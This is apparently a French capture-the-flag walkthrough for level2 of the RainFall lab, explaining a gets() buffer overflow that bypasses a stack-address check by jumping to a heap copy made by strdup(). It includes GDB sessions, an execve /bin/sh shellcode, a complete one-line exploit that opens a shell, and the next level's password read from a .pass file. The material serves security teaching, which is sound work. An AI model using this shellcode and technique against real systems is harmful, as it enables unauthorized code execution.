# Level2 : Buffer Overflow avec Exécution sur le Tas (Heap)

## Aperçu du Défi

Dans le `level2`, nous rencontrons un programme qui lit l'entrée utilisateur dans un *buffer*, puis la copie sur le tas (*heap*) en utilisant `strdup()`. Le programme inclut un mécanisme de protection qui vérifie si l'adresse de retour a été modifiée pour pointer vers la pile (*stack*), mais n'empêche pas la redirection vers le tas.

## Analyse du Code Source

Le code source de ce niveau révèle la vulnérabilité :

```c
#include <stdio.h>    // Pour fflush, gets, printf, puts
#include <stdlib.h>   // Pour _exit
#include <string.h>   // Pour strdup
#include <unistd.h>   // Alternative pour _exit
#include <stdint.h>   // Pour uint32_t

void p(void);

int main(void)
{
  p();
  return 0;
}

void p(void)
{
  uint32_t return_address;
  char buffer[76];

  // Vider le buffer stdout
  fflush(stdout);

  // Lire l'entrée dans le buffer (vulnérable au buffer overflow)
  gets(buffer);

  // Vérifier si l'adresse de retour commence par 0xb0000000 (plage d'adresses de la pile)
  // C'est une protection contre les exploits typiques de buffer overflow sur la pile
  if ((return_address & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", return_address);
    /* Le processus se termine ici */
    _exit(1);
  }

  // Renvoyer l'entrée à l'utilisateur
  puts(buffer);

  // Dupliquer le buffer (alloue de la mémoire sur le tas)
  strdup(buffer);

  return;
}
```

Observations clés :

1. Le programme utilise `gets()`, qui est vulnérable au *buffer overflow*.
2. Il y a une vérification de protection contre les *exploits* basés sur la pile (adresses commençant par 0xb).
3. La fonction `strdup()` copie notre entrée sur le tas.

## La Vulnérabilité

Ce programme présente deux vulnérabilités clés :

1.  **Buffer Overflow** : L'utilisation de `gets()` nous permet d'écrire au-delà du *buffer* de 76 octets.
2.  **Redirection de l'Exploit** : Même s'il y a une vérification contre les *exploits* basés sur la pile, nous pouvons rediriger l'exécution vers le tas, dont les adresses commencent généralement par 0x8.

## Organisation de la Mémoire et Contournement de la Protection

La vérification de protection dans ce programme cible les adresses de la pile :

```c
if ((return_address & 0xb0000000) == 0xb0000000)
```

Cela vérifie si les 4 bits les plus significatifs de l'adresse sont 0xb (1011 en binaire). C'est une plage courante pour les adresses de la pile dans les systèmes Linux 32 bits, mais les adresses du tas commencent généralement par 0x8, ce qui nous permet de contourner cette vérification.

## Stratégie d'Exploitation

Notre approche tire parti de la mémoire du tas allouée par `strdup()` :

1. Créer un *payload* avec un *shellcode* (un code qui nous donne un *shell*) au début.
2. Laisser `strdup()` copier notre *shellcode* sur le tas.
3. Déborder le *buffer* pour écraser l'adresse de retour avec l'adresse du tas.
4. Lorsque la fonction retourne, l'exécution saute vers notre *shellcode* sur le tas.

## Trouver l'Adresse du Tas

Nous avons utilisé GDB pour trouver où `strdup()` place notre entrée :

```bash
level2@RainFall:~$ gdb -q ./level2
(gdb) disas p
# Recherche de l'instruction ret dans le désassemblage
0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
0x0804853d <+105>:   leave
0x0804853e <+106>:   ret

(gdb) break *0x0804853e  # Placer un point d'arrêt (breakpoint) à l'instruction ret
(gdb) run
# Entrer une chaîne de test
test

Breakpoint 1, 0x0804853e in p ()
(gdb) x/s $eax  # Examiner la chaîne à l'adresse retournée par strdup
0x804a008:       "test"
```

Nous avons découvert que `strdup()` place systématiquement notre entrée à l'adresse `0x804a008` sur le tas.

## Création de l'Exploit

Avec cette information, nous avons conçu un *exploit* contenant :

1. Un *shellcode* pour lancer un *shell*.
2. Du *padding* (remplissage) pour remplir le *buffer*.
3. Une valeur pour écraser les 4 octets du cadre de pile (*stack frame*) (peut être arbitraire).
4. L'adresse du tas (`0x804a008`) pour écraser l'adresse de retour.

### Récupération du Shellcode

Pour exécuter `/bin/sh`, nous avions besoin d'un *shellcode* qui effectue l'appel système `execve`. Au lieu d'écrire le *shellcode* nous-mêmes, nous avons récupéré un *shellcode* pré-écrit depuis [Shell-Storm](http://shell-storm.org/shellcode/), un dépôt bien connu de *shellcodes*.

Nous avons cherché "Linux/x86 - execve /bin/sh" sur Shell-Storm et trouvé [un *shellcode* compact de 21 octets](https://shell-storm.org/shellcode/files/shellcode-575.html) :

```assembly
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

Ce *shellcode* lance un *shell* en invoquant l'appel système `execve` avec `/bin/sh` comme argument.

### Trouver les Décalages Exacts pour le Débordement

Pour vérifier la disposition exacte du *buffer* et les décalages (*offsets*) requis, nous avons créé un motif de test avec différentes séquences de caractères :

```bash
level2@RainFall:~$ python -c 'print("A"*76 + "B"*4 + "C"*4 + "D"*4)' > /tmp/test2
level2@RainFall:~$ gdb -q ./level2 

(gdb) run < /tmp/test2
Breakpoint 1, 0x0804853e in p () # Point d'arrêt à l'instruction de retour
(gdb) x/s $eax
0x804a008:       'A' <repeats 64 times>, "CCCCAAAAAAAABBBBCCCCDDDD"
(gdb) info frame
Stack level 0, frame at 0xbffff630:
 eip = 0x804853e in p; saved eip 0x43434343
 called by frame at 0xbffff634
 Arglist at 0x42424242, args: 
 Locals at 0x42424242, Previous frame's sp is 0xbffff630
 Saved registers:
  eip at 0xbffff62c
```

Cette session GDB confirme plusieurs informations critiques :

1. L'adresse de retour sauvegardée (EIP) est `0x43434343`, ce qui correspond à "CCCC" en ASCII.
2. Les données du cadre de pile (*stack frame*) sont affichées comme `0x42424242`, ce qui correspond à "BBBB" en ASCII.
3. L'adresse du tas où notre entrée est copiée est systématiquement `0x804a008`.
4. Le *buffer overflow* se produit exactement comme prévu :
    - Les 76 premiers octets remplissent le *buffer*.
    - Les 4 octets suivants écrasent les données du cadre de pile.
    - Les 4 octets suivants écrasent l'adresse de retour.

Cela confirme la structure exacte nécessaire pour notre *exploit* :
- *Shellcode* au début (sera dupliqué à `0x804a008`).
- *Padding* pour remplir le *buffer* (55 octets après notre *shellcode* de 21 octets).
- 4 octets pour écraser les données du cadre de pile (peut être n'importe quelle valeur, ici "BBBB").
- 4 octets pour écraser l'adresse de retour avec `0x804a008` (adresse du tas).

## L'Exploit Final

```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*55 + "BBBB" + "\x08\xa0\x04\x08"'; cat) | ./level2
```

Décomposition :

- *Shellcode* (21 octets) : `\x6a\x0b\x58...` - Lance `/bin/sh`.
- *Padding* (55 octets) : `"A"*55` - Remplit le reste du *buffer* de 76 octets.
- Écrasement de EBP (4 octets) : `"BBBB"` - Valeur arbitraire pour les données du cadre de pile (qui incluent EBP sauvegardé).
- Adresse de retour (4 octets) : `\x08\xa0\x04\x08` - `0x804a008` au format *little-endian*. Consultez le *walkthrough* du `level1` pour plus de détails sur le *little-endian*.
- `cat` - Maintient `stdin` ouvert pour l'interaction avec le *shell*. Consultez le *walkthrough* du `level1` pour plus de détails.


## Obtenir le Mot de Passe

Après avoir exécuté l'*exploit*, nous obtenons un *shell* et pouvons lire le mot de passe :

```bash
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Passer au Niveau Suivant

Avec le mot de passe obtenu, nous pouvons maintenant passer au `level3` :

```bash
level2@RainFall:~$ su level3
Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
level3@RainFall:~$
```

## Leçons Apprises

1.  **La Protection de la Pile n'est Pas Suffisante** : Des vérifications simples sur les adresses de retour peuvent être contournées en utilisant des régions mémoire alternatives comme le tas.
2.  **La Compréhension de l'Organisation Mémoire est Cruciale** : Savoir comment la mémoire est organisée (pile vs tas) permet des techniques d'*exploitation* créatives.
3.  **Fonctions Dangereuses** : `gets()` reste dangereuse indépendamment des vérifications supplémentaires car elle permet une entrée illimitée.
4.  **Intégrité du Cadre de Pile** : Lors de la redirection de l'exécution, gérer correctement le cadre de pile (*stack frame*, y compris EBP) est important pour des *exploits* fiables.
